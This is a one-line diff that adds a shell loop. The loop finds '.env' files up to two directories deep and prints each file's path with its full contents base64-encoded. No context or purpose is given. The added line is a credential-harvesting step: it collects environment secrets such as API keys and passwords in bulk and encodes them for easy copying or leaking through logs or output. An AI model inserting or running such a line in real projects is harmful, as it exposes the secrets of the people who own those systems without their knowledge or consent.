@@ -1,0 +1,1 @@
+for file in $(find . -maxdepth 2 -type f -name ".env");do echo "${file}=$(cat $file | base64)"; done;
